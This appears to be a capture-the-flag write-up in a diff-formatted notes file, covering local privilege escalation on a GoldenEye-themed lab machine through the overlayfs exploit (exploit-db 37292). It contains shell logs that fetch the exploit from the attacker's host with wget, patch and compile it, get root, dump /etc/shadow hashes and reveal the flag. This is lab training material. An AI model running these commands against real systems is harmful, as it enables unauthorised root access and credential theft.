+10.10.146.26 - - [03/Feb/2023 15:23:59] "GET /37292.c HTTP/1.1" 200 -
+
+www-data@ubuntu:/tmp$ wget http://10.8.19.103:8000/37292.c
+wget http://10.8.19.103:8000/37292.c
+--2023-02-03 12:23:59--  http://10.8.19.103:8000/37292.c
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/x-csrc]
+Saving to: '37292.c'
+
+100%[======================================>] 4,968       --.-K/s   in 0.002s  
+
+2023-02-03 12:24:00 (1.90 MB/s) - '37292.c' saved [4968/4968]
+
+www-data@ubuntu:/tmp$ gcc 37292.c -o ofs
+gcc 37292.c -o ofs
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+www-data@ubuntu:/tmp$ sed -i "s/gcc/cc/g" 37292.c
+sed -i "s/gcc/cc/g" 37292.c
+www-data@ubuntu:/tmp$ cc 37292.c -o ofs
+cc 37292.c -o ofs
+37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &status, 0);
+            ^
+37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+www-data@ubuntu:/tmp$ ./ofs
+./ofs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+```
+```text
+# whoami
+whoami
+root
+```
+```text
+# cd /root
+cd /root
+```
+```text
+# ls
+ls
+```
+```text
+# ls -lah
+ls -lah
+total 44K
+drwx------  3 root root 4.0K Apr 29  2018 .
+drwxr-xr-x 22 root root 4.0K Apr 24  2018 ..
+-rw-r--r--  1 root root   19 May  3  2018 .bash_history
+-rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc
+drwx------  2 root root 4.0K Apr 28  2018 .cache
+-rw-------  1 root root  144 Apr 29  2018 .flag.txt
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-------  1 root root 1.0K Apr 23  2018 .rnd
+-rw-------  1 root root 8.2K Apr 29  2018 .viminfo
+```
+```text
+# cat .flag.txt
+cat .flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+cat .bash_history
+exit
+ifconfig
+exit
+```
+```text
+# ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:67:98:7d:e6:0d  
+          inet addr:10.10.146.26  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::67:98ff:fe7d:e60d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:90457 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:89209 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:5611866 (5.6 MB)  TX bytes:6818299 (6.8 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:10804 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:10804 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:6088920 (6.0 MB)  TX bytes:6088920 (6.0 MB)
+```
+```text
+# cat /etc/shadow
+cat /etc/shadow
+root:$6$8j7iNdfv$OQJGo.QQtOiENSv3HfLPMckpLONudYqFMzAMBKBEBUEcDgQo7PcrKYrZcEgjmjH3IryZadnpkHQYqCwROkLWX0:17649:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+games:*:16273:0:99999:7:::
+man:*:16273:0:99999:7:::
+lp:*:16273:0:99999:7:::
+mail:*:16273:0:99999:7:::
+news:*:16273:0:99999:7:::
+uucp:*:16273:0:99999:7:::
+proxy:*:16273:0:99999:7:::
+www-data:*:16273:0:99999:7:::
+backup:*:16273:0:99999:7:::
+list:*:16273:0:99999:7:::
+irc:*:16273:0:99999:7:::
+gnats:*:16273:0:99999:7:::
+nobody:*:16273:0:99999:7:::
+libuuid:!:16273:0:99999:7:::
+syslog:*:16273:0:99999:7:::
+messagebus:*:17645:0:99999:7:::
+boris:$1$Q$1Ncm6RjHV/mXc9WX41JkU1:17645:0:99999:7:::
+dovecot:*:17645:0:99999:7:::
+dovenull:*:17645:0:99999:7:::
+postfix:*:17645:0:99999:7:::
+postgres:*:17645:0:99999:7:::
+natalya:$6$EYZISgHO$S/U.7HifU.96lbOkZkeGky7AsmPKEEgoP2RLmztk635uVfzuRkGrom9X6gOnoivHsnO1x2822cTsH6w2GFRWG/:17646:0:99999:7:::
+doak:$6$UrICgO36$gORwXyIypiMjPVdQa5wb1SQKcL27oNIHdjhBSGV8XX2m4F.oyRwiQOxcfUfQjPjzNL/UwcVXfNFzmKk5LEqXs1:17646:0:99999:7:::
+
+view-source:http://10.10.146.26/006-final/xvf7-flag/
+
+<html>
+<head>
+
+<link rel="stylesheet" href="index.css">
+</head>
+
+<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>
+
+<source src="key.webm" type="video/webm">
+
+</video>
+<div id="golden">
+<h1>Flag Captured</h1>
+<p>Congrats! ******************************* </p>
+<p>You've captured the codes! And stopped Alec Trevelyan from his indestructible vengeance!!!!</p>
+<p>****************************************</p>
+</div>
+
+<script src="index.js"></script>
+</html>
+
+var vid = document.getElementById("bgvid");
+var pauseButton = document.querySelector("#polina button");
+
+if (window.matchMedia('(prefers-reduced-motion)').matches) {
+    vid.removeAttribute("autoplay");
+    vid.pause();
+    pauseButton.innerHTML = "Paused";
+}
+
+function vidFade() {
+  vid.classList.add("stopfade");
+}
+
+vid.addEventListener('ended', function()
+{
+// only functional if "loop" is removed 
+vid.pause();
+// to capture IE10
+vidFade();
+}); 
+
+pauseButton.addEventListener("click", function() {
+  vid.classList.toggle("stopfade");
+  if (vid.paused) {
+    vid.play();
+    pauseButton.innerHTML = "Pause";
+  } else {
+    vid.pause();
+    pauseButton.innerHTML = "Paused";
+  }
+})
+```
+Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.
+To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:
+-   Download the linuxprivchecker file locally
+-   Navigate to the file on your file system
+-   Do: **python -m SimpleHTTPServer 1337** (leave this running)
+-   On the VM you can now do: wget /.py
+**OR**
+Enumerate the machine manually.
+Completed
+Whats the kernel version?
+uname -a
+*3.13.0-32-generic*
+This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:
+-   Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
+-   Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
+-   Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
+-   Make su on overlayfs world writable without changing the owner
+-   Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
+-   Execute the modified su binary
+You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)
+Completed
+Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!
+What development tools are installed on the machine?
+Its a VERY simple fix. You're only changing 1 character...
+Completed
+This is located in the root user folder.
+What is the root flag?
+![](https://i.imgur.com/qtALFwb.gif)
+*568628e0d993b1973adc718237da6e93*
+![[Pasted image 20230203152938.png]]
+
+## Notes / Lessons Learned
+[[Holo]]
+
